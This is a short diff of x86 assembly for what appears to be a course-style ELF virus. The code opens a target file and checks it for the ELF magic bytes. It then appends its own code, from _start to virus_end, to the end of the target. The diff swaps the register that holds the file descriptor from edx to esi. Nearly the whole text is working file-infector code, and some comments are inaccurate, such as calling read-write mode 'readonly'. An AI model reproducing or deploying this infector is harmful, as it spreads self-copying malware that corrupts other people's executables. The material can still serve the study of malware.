@@ -6,7 +6,7 @@
 %endmacro
 
 %macro	syscall3 4
-	mov	edx, %4
+	mov	esi, %4
 	mov	ecx, %3
 	mov	ebx, %2
 	mov	eax, %1
@@ -61,18 +61,18 @@ _start:
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 	;CODE START
 	open FileName, 2, 0777 		; open FileName with readonly and 111 permissions  (read)
-	mov edx, eax				; save fd in edx
-	cmp edx, 0
+	mov esi, eax				; save fd in esi
+	cmp esi, 0
 	jl _print_failure
-	read edx, esp, 4			; read first 4 bytes into esp (reserved place)
+	read esi, esp, 4			; read first 4 bytes into esp (reserved place)
 	cmp dword [esp], 0x464c457f ;cmp STK_RES to elf magic bytes
 	jne _print_failure
 	;now we should write the code from _start to virus_end
 	call get_my_loc				;now ecx holds location for next_i
 	add ecx, next_i-_start		;add ecx the offset from next_i to _start, now ecx points at _start address
-	lseek edx, 0, SEEK_END		;jump with the ELF file descriptor to it's end
-	write edx, ecx, virus_end-_start
-	close edx
+	lseek esi, 0, SEEK_END		;jump with the ELF file descriptor to it's end
+	write esi, ecx, virus_end-_start
+	close esi
 	jmp VirusExit
 	
 	_print_failure:
